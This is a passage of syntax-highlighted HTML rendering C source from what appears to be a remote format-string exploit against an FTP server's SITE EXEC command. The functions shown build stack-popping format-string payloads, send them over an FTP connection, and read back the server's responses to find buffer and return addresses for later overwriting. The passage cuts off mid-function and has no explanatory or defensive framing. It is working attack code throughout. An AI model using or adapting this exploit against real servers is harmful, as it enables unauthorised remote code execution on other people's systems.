            </span><span class="sc11">xpb_double</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">xp_bufdist</span><span class="sc0"> </span><span class="sc10">%</span><span class="sc0"> </span><span class="sc4">8</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">/</span><span class="sc0"> </span><span class="sc4">4</span><span class="sc10">;</span><span class="sc0">
        </span><span class="sc10">}</span><span class="sc0"> </span><span class="sc5">else</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0">
            </span><span class="sc11">ftp_recv_until</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">ftpsock</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc5">NULL</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"200 "</span><span class="sc10">);</span><span class="sc0">
        </span><span class="sc10">}</span><span class="sc0">

        </span><span class="sc11">figure</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">strstr</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">rbuf</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"_%|x|"</span><span class="sc10">);</span><span class="sc0">
        </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">figure</span><span class="sc0"> </span><span class="sc10">==</span><span class="sc0"> </span><span class="sc5">NULL</span><span class="sc10">)</span><span class="sc0">
            </span><span class="sc5">continue</span><span class="sc10">;</span><span class="sc0">
        </span><span class="sc11">figure</span><span class="sc0"> </span><span class="sc10">+=</span><span class="sc0"> </span><span class="sc4">5</span><span class="sc10">;</span><span class="sc0">

        </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(*</span><span class="sc11">figure</span><span class="sc0"> </span><span class="sc10">!=</span><span class="sc0"> </span><span class="sc7">'_'</span><span class="sc10">)</span><span class="sc0">
            </span><span class="sc5">continue</span><span class="sc10">;</span><span class="sc0">

        </span><span class="sc5">for</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">n</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc0"> </span><span class="sc10">;</span><span class="sc0"> </span><span class="sc10">*</span><span class="sc11">figure</span><span class="sc0"> </span><span class="sc10">==</span><span class="sc0"> </span><span class="sc7">'_'</span><span class="sc0"> </span><span class="sc10">;</span><span class="sc0"> </span><span class="sc10">++</span><span class="sc11">figure</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc10">++</span><span class="sc11">n</span><span class="sc10">)</span><span class="sc0">
            </span><span class="sc10">;</span><span class="sc0">

        </span><span class="sc11">xp_bufaddr</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">addr</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc11">n</span><span class="sc0"> </span><span class="sc10">-</span><span class="sc0"> </span><span class="sc11">tend</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc4">1</span><span class="sc10">;</span><span class="sc0">
        </span><span class="sc5">return</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">xp_bufaddr</span><span class="sc10">);</span><span class="sc0">
    </span><span class="sc10">}</span><span class="sc0">

    </span><span class="sc5">return</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc4">0</span><span class="sc10">);</span><span class="sc0">
</span><span class="sc10">}</span><span class="sc0">


</span><span class="sc16">void</span><span class="sc0">
</span><span class="sc11">xpad_cat</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc16">unsigned</span><span class="sc0"> </span><span class="sc16">char</span><span class="sc0"> </span><span class="sc10">*</span><span class="sc11">fabuf</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc16">unsigned</span><span class="sc0"> </span><span class="sc16">long</span><span class="sc0"> </span><span class="sc16">int</span><span class="sc0"> </span><span class="sc11">addr</span><span class="sc10">)</span><span class="sc0">
</span><span class="sc10">{</span><span class="sc0">
    </span><span class="sc16">int</span><span class="sc0">     </span><span class="sc11">i</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc16">unsigned</span><span class="sc0"> </span><span class="sc16">char</span><span class="sc0">   </span><span class="sc11">c</span><span class="sc10">;</span><span class="sc0">


    </span><span class="sc5">for</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">i</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc0"> </span><span class="sc10">;</span><span class="sc0"> </span><span class="sc11">i</span><span class="sc0"> </span><span class="sc10">&lt;=</span><span class="sc0"> </span><span class="sc4">3</span><span class="sc0"> </span><span class="sc10">;</span><span class="sc0"> </span><span class="sc10">++</span><span class="sc11">i</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0">
        </span><span class="sc5">switch</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">i</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0">
        </span><span class="sc5">case</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc4">0</span><span class="sc10">):</span><span class="sc0">
            </span><span class="sc11">c</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc16">unsigned</span><span class="sc0"> </span><span class="sc16">char</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">((</span><span class="sc11">addr</span><span class="sc0"> </span><span class="sc10">&amp;</span><span class="sc0"> </span><span class="sc4">0x000000ff</span><span class="sc10">)</span><span class="sc0">      </span><span class="sc10">);</span><span class="sc0">
            </span><span class="sc5">break</span><span class="sc10">;</span><span class="sc0">
        </span><span class="sc5">case</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc4">1</span><span class="sc10">):</span><span class="sc0">
            </span><span class="sc11">c</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc16">unsigned</span><span class="sc0"> </span><span class="sc16">char</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">((</span><span class="sc11">addr</span><span class="sc0"> </span><span class="sc10">&amp;</span><span class="sc0"> </span><span class="sc4">0x0000ff00</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">&gt;&gt;</span><span class="sc0">  </span><span class="sc4">8</span><span class="sc10">);</span><span class="sc0">
            </span><span class="sc5">break</span><span class="sc10">;</span><span class="sc0">
        </span><span class="sc5">case</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc4">2</span><span class="sc10">):</span><span class="sc0">
            </span><span class="sc11">c</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc16">unsigned</span><span class="sc0"> </span><span class="sc16">char</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">((</span><span class="sc11">addr</span><span class="sc0"> </span><span class="sc10">&amp;</span><span class="sc0"> </span><span class="sc4">0x00ff0000</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">&gt;&gt;</span><span class="sc0"> </span><span class="sc4">16</span><span class="sc10">);</span><span class="sc0">
            </span><span class="sc5">break</span><span class="sc10">;</span><span class="sc0">
        </span><span class="sc5">case</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc4">3</span><span class="sc10">):</span><span class="sc0">
            </span><span class="sc11">c</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc16">unsigned</span><span class="sc0"> </span><span class="sc16">char</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">((</span><span class="sc11">addr</span><span class="sc0"> </span><span class="sc10">&amp;</span><span class="sc0"> </span><span class="sc4">0xff000000</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">&gt;&gt;</span><span class="sc0"> </span><span class="sc4">24</span><span class="sc10">);</span><span class="sc0">
            </span><span class="sc5">break</span><span class="sc10">;</span><span class="sc0">
        </span><span class="sc10">}</span><span class="sc0">
        </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">c</span><span class="sc0"> </span><span class="sc10">==</span><span class="sc0"> </span><span class="sc4">0xff</span><span class="sc10">)</span><span class="sc0">
            </span><span class="sc11">sprintf</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">fabuf</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc11">strlen</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">fabuf</span><span class="sc10">),</span><span class="sc0"> </span><span class="sc6">"%c"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">c</span><span class="sc10">);</span><span class="sc0">

        </span><span class="sc11">sprintf</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">fabuf</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc11">strlen</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">fabuf</span><span class="sc10">),</span><span class="sc0"> </span><span class="sc6">"%c"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">c</span><span class="sc10">);</span><span class="sc0">
    </span><span class="sc10">}</span><span class="sc0">

    </span><span class="sc5">return</span><span class="sc10">;</span><span class="sc0">
</span><span class="sc10">}</span><span class="sc0">


</span><span class="sc16">unsigned</span><span class="sc0"> </span><span class="sc16">long</span><span class="sc0"> </span><span class="sc16">int</span><span class="sc0">
</span><span class="sc11">ftp_finddaddr</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc16">int</span><span class="sc0"> </span><span class="sc11">ftpsock</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc16">struct</span><span class="sc0"> </span><span class="sc11">host</span><span class="sc0"> </span><span class="sc10">*</span><span class="sc11">iptr</span><span class="sc10">)</span><span class="sc0">
</span><span class="sc10">{</span><span class="sc0">
    </span><span class="sc16">int</span><span class="sc0">         </span><span class="sc11">i</span><span class="sc10">,</span><span class="sc0">
                </span><span class="sc11">n</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">,</span><span class="sc0">
                </span><span class="sc11">blipcount</span><span class="sc10">,</span><span class="sc0">
                </span><span class="sc11">ssiz</span><span class="sc10">,</span><span class="sc0">
                </span><span class="sc11">tend</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc16">unsigned</span><span class="sc0"> </span><span class="sc16">long</span><span class="sc0"> </span><span class="sc16">int</span><span class="sc0">   </span><span class="sc11">addr</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc16">unsigned</span><span class="sc0"> </span><span class="sc16">char</span><span class="sc0">       </span><span class="sc11">popstackbuf</span><span class="sc10">[</span><span class="sc4">512</span><span class="sc10">];</span><span class="sc0">
    </span><span class="sc16">unsigned</span><span class="sc0"> </span><span class="sc16">char</span><span class="sc0">       </span><span class="sc11">fabuf</span><span class="sc10">[</span><span class="sc4">512</span><span class="sc10">];</span><span class="sc0">
    </span><span class="sc16">unsigned</span><span class="sc0"> </span><span class="sc16">char</span><span class="sc0">       </span><span class="sc11">sbuf</span><span class="sc10">[</span><span class="sc4">1024</span><span class="sc10">];</span><span class="sc0">
    </span><span class="sc16">unsigned</span><span class="sc0"> </span><span class="sc16">char</span><span class="sc0">       </span><span class="sc11">rbuf</span><span class="sc10">[</span><span class="sc4">1024</span><span class="sc10">];</span><span class="sc0">
    </span><span class="sc16">unsigned</span><span class="sc0"> </span><span class="sc16">char</span><span class="sc0"> </span><span class="sc10">*</span><span class="sc0">     </span><span class="sc11">figure</span><span class="sc10">;</span><span class="sc0">


    </span><span class="sc5">for</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">addr</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">FTP_tg</span><span class="sc10">-&gt;</span><span class="sc11">bufdaddr_start</span><span class="sc0"> </span><span class="sc10">;</span><span class="sc0"> </span><span class="sc11">addr</span><span class="sc0"> </span><span class="sc10">&gt;</span><span class="sc0"> </span><span class="sc11">FTP_tg</span><span class="sc10">-&gt;</span><span class="sc11">bufdaddr_end</span><span class="sc0"> </span><span class="sc10">;</span><span class="sc0">
        </span><span class="sc11">addr</span><span class="sc0"> </span><span class="sc10">-=</span><span class="sc0"> </span><span class="sc11">ssiz</span><span class="sc10">)</span><span class="sc0">
    </span><span class="sc10">{</span><span class="sc0">

        </span><span class="sc1">/* 1. build pop stack buffer
         */</span><span class="sc0">
        </span><span class="sc11">memset</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">popstackbuf</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc7">'\x00'</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc5">sizeof</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">popstackbuf</span><span class="sc10">));</span><span class="sc0">
        </span><span class="sc5">for</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">i</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">xpb_align</span><span class="sc10">;</span><span class="sc0"> </span><span class="sc11">i</span><span class="sc0"> </span><span class="sc10">&gt;</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc0"> </span><span class="sc10">;</span><span class="sc0"> </span><span class="sc10">--</span><span class="sc11">i</span><span class="sc10">)</span><span class="sc0">
            </span><span class="sc11">strcat</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">popstackbuf</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"z"</span><span class="sc10">);</span><span class="sc0">
        </span><span class="sc5">for</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">i</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">xpb_quad</span><span class="sc0"> </span><span class="sc10">;</span><span class="sc0"> </span><span class="sc11">i</span><span class="sc0"> </span><span class="sc10">&gt;</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc0"> </span><span class="sc10">;</span><span class="sc0"> </span><span class="sc10">--</span><span class="sc11">i</span><span class="sc10">)</span><span class="sc0">
            </span><span class="sc11">strcat</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">popstackbuf</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"%.f"</span><span class="sc10">);</span><span class="sc0">
        </span><span class="sc5">for</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">i</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">xpb_double</span><span class="sc0"> </span><span class="sc10">;</span><span class="sc0"> </span><span class="sc11">i</span><span class="sc0"> </span><span class="sc10">&gt;</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc0"> </span><span class="sc10">;</span><span class="sc0"> </span><span class="sc10">--</span><span class="sc11">i</span><span class="sc10">)</span><span class="sc0">
            </span><span class="sc11">strcat</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">popstackbuf</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"%d"</span><span class="sc10">);</span><span class="sc0">

        </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">esc_ok</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">addr</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">==</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">)</span><span class="sc0">     </span><span class="sc5">continue</span><span class="sc10">;</span><span class="sc0">

        </span><span class="sc1">/* 2. build write buffer
         */</span><span class="sc0">
        </span><span class="sc11">memset</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">fabuf</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc7">'\x00'</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc5">sizeof</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">fabuf</span><span class="sc10">));</span><span class="sc0">

        </span><span class="sc11">xpad_cat</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">fabuf</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">addr</span><span class="sc10">);</span><span class="sc0">
        </span><span class="sc11">sprintf</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">fabuf</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc11">strlen</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">fabuf</span><span class="sc10">),</span><span class="sc0"> </span><span class="sc6">"%s"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">popstackbuf</span><span class="sc10">);</span><span class="sc0">

        </span><span class="sc11">sprintf</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">sbuf</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"SITE EXEC 7 %s"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">fabuf</span><span class="sc10">);</span><span class="sc0">
        </span><span class="sc11">ssiz</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc4">500</span><span class="sc0"> </span><span class="sc10">-</span><span class="sc0"> </span><span class="sc11">strlen</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">sbuf</span><span class="sc10">);</span><span class="sc0">
        </span><span class="sc5">for</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">i</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">ssiz</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">blipcount</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc0"> </span><span class="sc10">;</span><span class="sc0"> </span><span class="sc11">i</span><span class="sc0"> </span><span class="sc10">&gt;</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc0"> </span><span class="sc10">;</span><span class="sc0"> </span><span class="sc10">--</span><span class="sc11">i</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">blipcount</span><span class="sc10">++)</span><span class="sc0">
            </span><span class="sc11">strcat</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">sbuf</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"_"</span><span class="sc10">);</span><span class="sc0">
        </span><span class="sc11">sprintf</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">sbuf</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc11">strlen</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">sbuf</span><span class="sc10">),</span><span class="sc0"> </span><span class="sc6">"%%%%|x|%%.%ds"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">ssiz</span><span class="sc10">);</span><span class="sc0">  </span><span class="sc1">/* XXX: thx smiler */</span><span class="sc0">
        </span><span class="sc11">ssiz</span><span class="sc0"> </span><span class="sc10">-=</span><span class="sc0"> </span><span class="sc4">16</span><span class="sc10">;</span><span class="sc0">


        </span><span class="sc11">net_write</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">ftpsock</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"%s\n"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">sbuf</span><span class="sc10">);</span><span class="sc0">

        </span><span class="sc11">memset</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">rbuf</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc7">'\x00'</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc5">sizeof</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">rbuf</span><span class="sc10">));</span><span class="sc0">

        </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">net_rlinet</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">ftpsock</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">rbuf</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc5">sizeof</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">rbuf</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">-</span><span class="sc0"> </span><span class="sc4">1</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc4">8</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">&lt;=</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0">
            </span><span class="sc11">close</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">ftpsock</span><span class="sc10">);</span><span class="sc0">
            </span><span class="sc11">ftpsock</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">ftp_login</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">iptr</span><span class="sc10">);</span><span class="sc0">
            </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">ftpsock</span><span class="sc0"> </span><span class="sc10">&lt;=</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0">
                </span><span class="sc11">exit</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">EXIT_FAILURE</span><span class="sc10">);</span><span class="sc0">
            </span><span class="sc10">}</span><span class="sc0">
            </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">xp_refind</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0">
                </span><span class="sc11">xp_bufdist</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">ftp_finddist</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">ftpsock</span><span class="sc10">);</span><span class="sc0">
                </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">xp_bufdist</span><span class="sc0"> </span><span class="sc10">==</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0">
                    </span><span class="sc11">exit</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">EXIT_FAILURE</span><span class="sc10">);</span><span class="sc0">
                </span><span class="sc10">}</span><span class="sc0">
                </span><span class="sc11">xpb_align</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">xp_bufdist</span><span class="sc0"> </span><span class="sc10">%</span><span class="sc0"> </span><span class="sc4">4</span><span class="sc10">;</span><span class="sc0">
                </span><span class="sc11">xpb_quad</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">xp_bufdist</span><span class="sc0"> </span><span class="sc10">/</span><span class="sc0"> </span><span class="sc4">8</span><span class="sc10">;</span><span class="sc0">
                </span><span class="sc11">xpb_double</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">xp_bufdist</span><span class="sc0"> </span><span class="sc10">%</span><span class="sc0"> </span><span class="sc4">8</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">/</span><span class="sc0"> </span><span class="sc4">4</span><span class="sc10">;</span><span class="sc0">
            </span><span class="sc10">}</span><span class="sc0">
        </span><span class="sc10">}</span><span class="sc0"> </span><span class="sc5">else</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0">
            </span><span class="sc11">ftp_recv_until</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">ftpsock</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc5">NULL</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"200 "</span><span class="sc10">);</span><span class="sc0">
        </span><span class="sc10">}</span><span class="sc0">

        </span><span class="sc11">figure</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">strstr</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">rbuf</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"_%|x|"</span><span class="sc10">);</span><span class="sc0">
        </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">figure</span><span class="sc0"> </span><span class="sc10">==</span><span class="sc0"> </span><span class="sc5">NULL</span><span class="sc10">)</span><span class="sc0">
            </span><span class="sc5">continue</span><span class="sc10">;</span><span class="sc0">
        </span><span class="sc11">tend</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">figure</span><span class="sc0"> </span><span class="sc10">-</span><span class="sc0"> </span><span class="sc11">rbuf</span><span class="sc10">;</span><span class="sc0">
        </span><span class="sc11">figure</span><span class="sc0"> </span><span class="sc10">+=</span><span class="sc0"> </span><span class="sc4">5</span><span class="sc10">;</span><span class="sc0">

        </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(*</span><span class="sc11">figure</span><span class="sc0"> </span><span class="sc10">!=</span><span class="sc0"> </span><span class="sc7">'_'</span><span class="sc0"> </span><span class="sc10">||</span><span class="sc0"> </span><span class="sc11">strstr</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">figure</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"_%|x|"</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">==</span><span class="sc0"> </span><span class="sc5">NULL</span><span class="sc10">)</span><span class="sc0">
            </span><span class="sc5">continue</span><span class="sc10">;</span><span class="sc0">

        </span><span class="sc5">for</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">n</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc0"> </span><span class="sc10">;</span><span class="sc0"> </span><span class="sc10">*</span><span class="sc11">figure</span><span class="sc0"> </span><span class="sc10">==</span><span class="sc0"> </span><span class="sc7">'_'</span><span class="sc0"> </span><span class="sc10">;</span><span class="sc0"> </span><span class="sc10">++</span><span class="sc11">figure</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc10">++</span><span class="sc11">n</span><span class="sc10">)</span><span class="sc0">
            </span><span class="sc10">;</span><span class="sc0">


        </span><span class="sc11">xp_dstaddr</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">addr</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc11">n</span><span class="sc0"> </span><span class="sc10">-</span><span class="sc0"> </span><span class="sc11">tend</span><span class="sc0"> </span><span class="sc10">-</span><span class="sc0"> </span><span class="sc4">1</span><span class="sc10">;</span><span class="sc0">

        </span><span class="sc5">return</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">xp_dstaddr</span><span class="sc10">);</span><span class="sc0">
    </span><span class="sc10">}</span><span class="sc0">

    </span><span class="sc5">return</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc4">0</span><span class="sc10">);</span><span class="sc0">
</span><span class="sc10">}</span><span class="sc0">


</span><span class="sc16">unsigned</span><span class="sc0"> </span><span class="sc16">long</span><span class="sc0"> </span><span class="sc16">int</span><span class="sc0">
</span><span class="sc11">ftp_findrl</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc16">int</span><span class="sc0"> </span><span class="sc11">ftpsock</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc16">unsigned</span><span class="sc0"> </span><span class="sc16">long</span><span class="sc0"> </span><span class="sc16">int</span><span class="sc0"> </span><span class="sc11">retloc</span><span class="sc10">)</span><span class="sc0">
</span><span class="sc10">{</span><span class="sc0">
    </span><span class="sc16">int</span><span class="sc0">     </span><span class="sc11">i</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc16">unsigned</span><span class="sc0"> </span><span class="sc16">char</span><span class="sc0"> </span><span class="sc10">*</span><span class="sc0"> </span><span class="sc11">sn</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc16">unsigned</span><span class="sc0"> </span><span class="sc16">char</span><span class="sc0">   </span><span class="sc11">popstackbuf</span><span class="sc10">[</span><span class="sc4">512</span><span class="sc10">];</span><span class="sc0">
    </span><span class="sc16">unsigned</span><span class="sc0"> </span><span class="sc16">char</span><span class="sc0">   </span><span class="sc11">sbuf</span><span class="sc10">[</span><span class="sc4">512</span><span class="sc10">];</span><span class="sc0">
    </span><span class="sc16">unsigned</span><span class="sc0"> </span><span class="sc16">char</span><span class="sc0">   </span><span class="sc11">rbuf</span><span class="sc10">[</span><span class="sc4">2048</span><span class="sc10">];</span><span class="sc0">


    </span><span class="sc11">memset</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">popstackbuf</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc7">'\x00'</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc5">sizeof</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">popstackbuf</span><span class="sc10">));</span><span class="sc0">
    </span><span class="sc5">for</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">i</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">xpb_align</span><span class="sc10">;</span><span class="sc0"> </span><span class="sc11">i</span><span class="sc0"> </span><span class="sc10">&gt;</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc0"> </span><span class="sc10">;</span><span class="sc0"> </span><span class="sc10">--</span><span class="sc11">i</span><span class="sc10">)</span><span class="sc0">
        </span><span class="sc11">strcat</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">popstackbuf</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"z"</span><span class="sc10">);</span><span class="sc0">
    </span><span class="sc5">for</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">i</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">xpb_quad</span><span class="sc0"> </span><span class="sc10">;</span><span class="sc0"> </span><span class="sc11">i</span><span class="sc0"> </span><span class="sc10">&gt;</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc0"> </span><span class="sc10">;</span><span class="sc0"> </span><span class="sc10">--</span><span class="sc11">i</span><span class="sc10">)</span><span class="sc0">
